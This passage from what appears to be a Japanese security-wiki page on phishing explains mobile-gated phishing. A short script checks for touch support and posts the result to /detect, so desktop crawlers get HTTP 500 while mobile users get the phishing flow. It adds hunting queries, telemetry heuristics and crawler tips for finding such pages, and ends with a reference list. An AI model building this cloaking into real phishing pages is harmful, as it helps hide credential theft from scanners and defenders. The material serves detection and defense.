Operatorsは、desktop crawlerが最終ページに到達できないよう、単純なdevice checkの背後にphishing flowを置くケースを増やしている。一般的なパターンでは、touch対応DOMをテストし、その結果をserver endpointにpostする小さなscriptを使用する。non-mobile clientにはHTTP 500（または空白ページ）を返し、mobile userには完全なflowを提供する。<sup>[[7]](#references)</sup>

最小限のclient snippet（典型的なlogic）：
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` のロジック（簡略版）：
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
サーバーでよく観察される挙動:
- 初回ロード時にセッション Cookie を設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- 以降の GET で `is_mobile=false` の場合は 500（またはプレースホルダー）を返し、`true` の場合のみ phishing を提供する。

Hunting と検出のヒューリスティック:
- urlscan クエリ: `filename:"detect_device.js" AND page.status:500`
- Web テレメトリ: `GET /static/detect_device.js` → `POST /detect` → 非 mobile に対する HTTP 500 のシーケンス。正規の mobile victim のパスでは、後続の HTML/JS とともに 200 が返される。
- `ontouchstart` または類似のデバイスチェックだけを条件にコンテンツを提供するページをブロックするか、精査する。

防御のヒント:
- mobile に似た fingerprint と JS を有効にした状態で crawler を実行し、ゲートされたコンテンツを明らかにする。
- 新たに登録されたドメインで、`POST /detect` に続いて不審な 500 レスポンスが発生した場合にアラートを出す。

## References

- [1] [Phishing で使用されるドメインバリエーションの生成 (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing の発見: ツールとテクニック (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC を使用した認証情報の窃取と 2FA のバイパス (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC によるセッションの窃取と 2FA のバイパス (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy での Postfix による DKIM のインストールと設定方法 (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile でゲートされた phishing インフラとヒューリスティック (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attacks の次なるフロンティア: LLM を活用したリアルタイムでの phishing JavaScript 生成](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [なりすまし、Click Hijacking、TDS: Malware Distribution Ecosystem の内部](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com の Bitsquatting (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [ビット反転による Microsoft の windows.com へのトラフィックハイジャック (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: パキスタンを標的とした spyware campaign で lure として使用された偽 dating app](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat の IoC とサンプル](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
